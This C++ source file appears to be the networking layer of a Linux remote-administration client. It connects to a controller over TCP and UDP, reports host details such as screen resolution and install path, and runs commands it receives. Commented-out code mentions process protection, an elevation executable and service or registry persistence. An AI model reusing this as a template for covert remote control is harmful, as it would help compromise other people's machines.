#include "server.h"
#include "utils.h"
#include "commands.h"

int timeout_counter = 0;

//-----TCP-----//
void Server::sendTCP(std::string buf)
{
    std::string data(buf);
    data.append("<EOF>\0");

    int iResult = send( sockfd, data.c_str(), (data.length()+1), 0 );
    if (iResult < 0) {
        printf("ERROR: SEND\n");
        return;
    }
    timeout_counter = 0;
}

//Start the real thread for receiving
int Server::receive(PARSER p)
{
    //Create a new structure that isn't bounded by our current scope
    //Ideally this should be freed when we're done using it,
    //but because in an ideal situation we're never done,
    //I'll just leave it for now
    PARSESTRUCT *pst = static_cast<PARSESTRUCT*>(malloc(sizeof(PARSESTRUCT)));
    pst->p = p;
    pst->s = this;
    int rc = pthread_create(&receiveTCPThreads[0], NULL, &Server::waitForRecvFunc, pst);
    if (rc) {
        std::cout<<"THREAD CREATION FAILED\n";
    }
    return rc;
}

//Thread created to loop for receiving data.
//recvfunc() actually loops, this just starts that loop and receives its output
void *Server::waitForRecvFunc(void * v) {
    PARSESTRUCT *p = static_cast<PARSESTRUCT*>(v);

    while (true) {
        int exit_code = p->s->receive_low(p->p);

        /*
        printf("waitForRecvFunc: ");

        char exit_char[10];
        itoa(exit_code, exit_char, 10);
        printf("%s", exit_char);
        printf("\n");
        */
        if (exit_code == 2) {	//if the 'shutdown' command is received
            //exit(0); //TODO: THIS IS DIRTY
            //return 2;
        }
        if (exit_code == 3) {
            /*
            if (!IsElevated()) {
                set_process_critical(FALSE);
            }
            */
        }
        if (exit_code == 4) {	//if the 'uninstall' command was received
            //protect_service = false; //Possibly deprecated
            //set_process_critical(FALSE);	//remove possible process protection
            //testPort(2); //release the testPort() mutex
            //Sleep(6000);
            //CreateMyService("", FALSE);	//uninstall service
            //setRegKey(FALSE);	//remove possible registry key for servicemode
            //remove("w7us.exe");		//remove elevator
            //return 2;
        }   
    }
}

int Server::receive_low(PARSER p) {
    char recvbuf[DEFAULT_BUFLEN];
    memset(recvbuf, '\0', sizeof(recvbuf));
    if (timeout_counter >= 10)
    {
        timeout_counter = 0;
        return 1;
    }
    else if (timeout_counter == 5)
    {
        std::string sends = "LINUX";
        sends.append("> /echo");
        this->sendTCP(sends);
    }
    std::string recv_stream;
    bool cont = true;
    int iResult2 = 0;
    int ret = 0;

    fd_set fd;
    timeval timeout;
    FD_ZERO(&fd);
    FD_SET(sockfd, &fd);
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    int sel = 0;

    while (cont)
    {
        iResult2 = 0;
        sel = 0;
        sel = select(sockfd + 1, &fd, NULL, NULL, &timeout);
        if (sel > 0)
        {
            int e = recv(sockfd, recvbuf, DEFAULT_BUFLEN, 0);
            iResult2 = e;
            std::string temp_str = "";
            //if (encryptOn) temp_str = encrypt(recvbuf);
            temp_str = recvbuf; //else

            //std::cout << "TEMPSTR: " << temp_str << "\n";

            if (e > 1)
            {
                int loopcount = 1;
                while (temp_str.find("<EOF>") != -1)
                {   //While <EOF> is found in the buffer
                    //std::cout << "LOOP: " << loopcount << " DATA: " << temp_str << "\n";

                    if (temp_str.find("<EOF>") != (temp_str.length() - 5))
                    {                                                                     //if <EOF> isn't at the end of the buffer
                        p(this, temp_str.substr(0, temp_str.find("<EOF>")));             //parse everything up to <EOF>
                        temp_str = temp_str.substr(temp_str.find("<EOF>") + 5);           //set the rest to the beginning of the next string
                    }

                    else
                    {
                        ret = p(this, temp_str.substr(0, temp_str.find("<EOF>")));
                        temp_str = "";
                        cont = false; //Maybe not necessary?
                    }

                    loopcount++;
                }
            }
            else if (e == 0) {
                //On linux this can happen when the socket is
                //forcibly closed on the other side.
                //This is undeniable death.
                throw "Socket closed by remote host.";
            }
            else if (e < 0)
            {
                cont = false;
            }
        }
        else
        {
            cont = false;
        }
    }

    //--------------------Check to see how the recv() function did--------------------//
    if ((iResult2 <= 0) && (sel <= 1))
    {
        timeout_counter++;
    }
    else if (iResult2 < 0 || sel < 0)
    {
        printf("recv failed with error: %d\n", 0); //WSAGetLastError());
        return 1;
    }

    return ret;
}

int Server::connectTCP(std::string hostname, std::string port)
{
    int n;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    //class globals
    hostTCP = hostname;
    portTCP = port;

    //open socket
    int portno = atoi(port.c_str());
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0){
        printf("ERROR opening socket\n");
        return 1;
    }

    //get hostname and set up data structures
    server = gethostbyname(hostname.c_str());
    if (server == NULL)
    {
        fprintf(stderr, "ERROR, no such host\n");
        exit(0);
    }
    bzero((char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr,
          (char *)&serv_addr.sin_addr.s_addr,
          server->h_length);
    serv_addr.sin_port = htons(portno);

    //connect to host
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("ERROR connecting\n");
        return 1;
    }

    //Send custom intro data
    this->sendTCPIntro();

    return 0;
}

void Server::resetTCP()
{
    close(sockfd);
    this->connectTCP(hostTCP, portTCP);  
}

void Server::sendTCPIntro() {
    char x[10];
    char y[10];
    itoa(getDesktopResolution()[0], x, 10);
    itoa(getDesktopResolution()[1], y, 10);
    
	std::stringstream sends_res_x;
	sends_res_x << "/add_x " << x;
	this->sendTCP(sends_res_x.str());

	std::stringstream sends_res_y;
	sends_res_y << "/add_y " << y;
	this->sendTCP(sends_res_y.str());

	std::stringstream sends_ip;
    sends_ip << "/add_ip " << "0.0.0.0";
    this->sendTCP(sends_ip.str());

    char result[PATH_MAX];
	ssize_t count = readlink("/proc/self/exe", result, PATH_MAX);
    const char * pathe;
    if (count != -1) {
        pathe = dirname(result);
    }

	std::stringstream sends_path;
    sends_path << "/add_path " << pathe;
    this->sendTCP(sends_path.str());

    std::stringstream sends_name;;
	sends_name << "/add_name " << "LINUX" << "  VERSION: " << ".10";
    this->sendTCP(sends_name.str());
}
//-------------//

//-----UDP-----//
void Server::sendUDP(std::string buf)
{
    std::cout<<"SENDINGUDP: "<<buf<<"\n";
    int n = sendto(sock, buf.c_str(), strlen(buf.c_str()), 0, (struct sockaddr *)&server, slength);
    if (n < 0)
    {
        error("sendto");
    }
}

int Server::receiveUDP(PARSER p)
{
    //Create a new structure that isn't bounded by our current scope
    //Ideally this should be freed when we're done using it,
    //but because in an ideal situation we're never done,
    //I'll just leave it for now
    PARSESTRUCT *pst = static_cast<PARSESTRUCT*>(malloc(sizeof(PARSESTRUCT)));
    pst->p = p;
    pst->s = this;
    int rc = pthread_create(&receiveUDPThreads[0], NULL, &Server::waitForUDPFunc, pst);
    if (rc) {
        std::cout<<"THREAD CREATION FAILED\n";
    }
}

void *Server::waitForUDPFunc(void * v)
{
    PARSESTRUCT *p = static_cast<PARSESTRUCT*>(v);

    int s = 0;
    try {		//Backup in case we crash somewhere
        int return_val = 0;
        while (return_val != -1) {
            return_val = p->s->receiveUDP_low(p->p);
        }
    }
    catch (int e) {		//catch for the try/catch
        //server.send("/update_status -t PROGRAM CRASH - RESCUED -c 2");
        std::cout<<"ERROR: "<<e<<"\n";
    }
    std::cout<<"UDP RETURNED\n";
}

int Server::receiveUDP_low(PARSER p) {
    bool streamingUDP = true;

	//start communication
	std::string temp_str;
    while(streamingUDP)
    {
        char buf[BUFLEN];
        //receive a reply and print it
        //clear the buffer by filling null, it might have previously received data
        memset(buf,'\0', BUFLEN);
        struct sockaddr_in from;
        unsigned int length;
        int n = recvfrom(sock, buf, BUFLEN, 0, (struct sockaddr *)&from, &length);
        if (n < 0)
        {
            errorLite("recvfrom");
            return -1;
        }

		temp_str += buf;
		int e = strlen(buf);

		//std::cout<<temp_str<<"\n";

		if (e > 1) {
			while (temp_str.find("<EOF>") != -1) {

				if (temp_str.find("<EOF>") != (temp_str.length() - 5)) { //if <EOF> is not the end of the message (rare)
					if (!parseUDPMessages(*this, temp_str.substr(0, temp_str.find("<EOF>")))) parseMessages(*this, temp_str.substr(0, temp_str.find("<EOF>"))); //prioritize udp streaming
					temp_str = temp_str.substr(temp_str.find("<EOF>") + 5);
				}

				else {
					if (!parseUDPMessages(*this, temp_str.substr(0, temp_str.find("<EOF>")))) parseMessages(*this, temp_str.substr(0, temp_str.find("<EOF>"))); //prioritize udp streaming
					temp_str = "";
				}
			}
		}
		else if (e < 1) {
			streamingUDP = false;
			std::cout<<"DISCONNECT?\n";
            return -1;
			//break;
		}
	}
    return 1;
}

int Server::connectUDP(std::string hostname, std::string port)
{
    unsigned int length;
    struct sockaddr_in from;
    struct hostent *hp;
    char buffer[256];

    //class globals
    hostUDP = hostname;
    portUDP = port;

    //Open socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        std::cout<<"ERROR: SOCKET ERROR\n";
        return 0;
    }
    server.sin_family = AF_INET;

    //Get host by name
    hp = gethostbyname(hostname.c_str());
    if (hp == 0)
    {
        printf("ERROR: UNKNOWN HOST\n");
        return 0;
    }

    bcopy((char *)hp->h_addr,
          (char *)&server.sin_addr,
          hp->h_length);

    //Set port
    server.sin_port = htons(atoi(port.c_str()));
    length = sizeof(struct sockaddr_in);
    slength = length;

    return 1;
}
//-------------//